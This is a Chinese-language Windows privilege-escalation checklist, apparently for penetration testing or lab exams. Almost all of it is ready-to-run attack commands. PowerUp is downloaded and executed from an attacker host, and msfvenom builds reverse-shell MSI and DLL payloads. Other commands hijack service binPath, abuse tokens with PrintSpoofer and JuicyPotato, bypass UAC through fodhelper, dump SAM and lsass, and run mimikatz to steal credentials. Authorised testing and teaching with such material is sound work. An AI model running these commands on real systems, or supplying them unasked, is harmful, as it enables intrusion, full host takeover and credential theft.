# Windows 提权 checklist
## Reminders
- [ ] **先跑自动脚本**（winPEAS / PowerUp），再针对提示逐条人工验证
	```powershell
	.\winPEASx64.exe
	```
	```powershell
	IEX(New-Object Net.WebClient).DownloadString('http://<KALI>/PowerUp.ps1'); Invoke-AllChecks
	```
- [ ] 记录当前身份与系统信息（证据截图）
	```cmd
	whoami; hostname; systeminfo; systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
	```

## 用户与令牌权限
- [ ] 当前用户与所属组
	```cmd
	whoami; whoami /groups; whoami /all
	```
- [ ] 特权列表（重点 SeImpersonatePrivilege、SeAssignPrimaryToken、SeBackupPrivilege、SeRestorePrivilege、SeDebugPrivilege、SeTakeOwnershipPrivilege）
	```cmd
	whoami /priv
	```
- [ ] 检查当前进程是否运行在**高完整性**（UAC 状态）
	```cmd
	whoami /groups | findstr /i "Mandatory"
	```

## 服务提权（unquoted path / 可写服务）
- [ ] 枚举所有服务及二进制路径
	```cmd
	sc query state= all; wmic service get name,displayname,pathname,startmode
	```
- [ ] 找 **Unquoted Service Path**（路径带空格且没加引号）
	```powershell
	wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
	```
- [ ] 检查服务二进制所在目录是否**可写**（icacls 含 W / F / M）
	```cmd
	icacls "C:\Program Files\VulnSvc\"
	```
- [ ] 检查能否直接修改服务 binPath（`sc config` / `sc stop` / `sc start`）
	```cmd
	sc config <svc> binPath= "C:\temp\shell.exe"
	```
- [ ] 用 accesschk 查可写服务与注册表
	```cmd
	accesschk.exe -uwcqv "Everyone" * /accepteula
	```
- [ ] PowerUp 自动化识别（Get-UnquotedService、Get-ModifiableServiceFile、Get-ServiceDetail）

## 令牌模拟（SeImpersonate / SeAssignPrimaryToken）
- [ ] 确认有 SeImpersonatePrivilege 后，用土豆家族 / PrintSpoofer
	```cmd
	# PrintSpoofer（需 SYSTEM 启用了 SeImpersonate 的用户）
	.\PrintSpoofer.exe -i -c cmd
	```
- [ ] 检查 Print Spooler / 命名管道可用性；SeImpersonate 配合 SweetPotato / RoguePotato / JuicyPotato（旧系统）
	```cmd
	.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
	```

## SeBackup / SeRestore / SeDebug
- [ ] 有 SeBackupPrivilege 时，直接拷贝 SAM/SYSTEM 并 dump
	```cmd
	reg save HKLM\SAM SAM; reg save HKLM\SYSTEM SYSTEM
	```
	```bash
	# 攻击机
	impacket-secretsdump -sam SAM -system SYSTEM LOCAL
	```
- [ ] 有 SeBackupPrivilege 时用 robocopy / diskshadow 读受限文件（如 ntds.dit）
- [ ] 有 SeDebugPrivilege 时注入 lsass 或高权限进程（ProcDump dump lsass、mimikatz）
	```cmd
	procdump.exe -accepteula -ma lsass.exe lsass.dmp
	```

## alwaysInstallElevated / 注册表
- [ ] 检查两处注册表是否都设为 1（HKLM + HKCU）
	```cmd
	reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	```
- [ ] 用 msfvenom 生成 MSI 并以 SYSTEM 安装执行
	```bash
	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f msi -o shell.msi
	```
	```cmd
	msiexec /quiet /qn /i shell.msi
	```

## UAC 绕过
- [ ] 确认当前是管理员但处于中完整性（`whoami /groups` 无 High Mandatory）
- [ ] 常用绕过：fodhelper / computerdefaults / eventvwr（注册表劫持 + 高完整性程序触发）
	```cmd
	reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
	reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe /c start cmd.exe" /f
	```
	```cmd
	fodhelper.exe
	```

## DLL 劫持
- [ ] 找以高权限运行、缺 DLL 或加载顺序可被劫持的程序（winPEAS 会提示）
- [ ] 用 Process Monitor 观察加载失败的 DLL 名，生成同名恶意 DLL 放到可写目录
	```bash
	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f dll -o hijack.dll
	```
- [ ] 覆盖 KnownDLLs 无法劫持，优先找用户可写目录 + 高权限触发场景

## SAM / SYSTEM 与凭据
- [ ] 检查是否能直接读 SAM / SYSTEM / SECURITY
	```cmd
	copy C:\Windows\System32\config\SAM .; copy C:\Windows\System32\config\SYSTEM .
	```
- [ ] 查找明文密码/配置文件（unattend.xml、sysprep、web.config、backup）
	```cmd
	dir /s /b unattend.xml sysprep.xml *pass* *cred* web.config 2>nul
	type C:\Windows\Panther\unattend.xml
	```
- [ ] 检查存储的凭据（cmdkey / Credential Manager）
	```cmd
	cmdkey /list; rundll32 keymgr.dll,KRShowKeyMgr
	```
- [ ] 用 mimikatz 抓明文/hash（需管理员/SYSTEM，且注意 AV）
	```cmd
	mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
	```

## 历史文件与敏感文件
- [ ] PowerShell 历史
	```powershell
	type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
	```
- [ ] 检查各用户目录的文档、桌面、下载里是否有凭据/脚本
	```cmd
	dir /s /b C:\Users\*pass* C:\Users\*.txt C:\Users\*.kdbx
	```
- [ ] 检查 KeePass / 浏览器保存的密码 / RDP 连接配置
- [ ] 检查可写的自启动目录与计划任务
	```cmd
	schtasks /query /fo LIST /v | findstr /i "Task To Run"
	icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
	```

## 自动脚本
- [ ] winPEAS（全面）
	```cmd
	.\winPEASx64.exe > winpeas.txt
	```
- [ ] PowerUp（PowerShell 模块，专注提权）
	```powershell
	powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<KALI>/PowerUp.ps1'); Invoke-AllChecks"
	```
- [ ] Seatbelt（收集系统/用户/进程/凭据信息）
	```cmd
	.\Seatbelt.exe -group=all
	```
- [ ] 参考：PayloadsAllTheThings Windows 提权页（https://github.com/swisskyrepo/PayloadsAllTheThings）
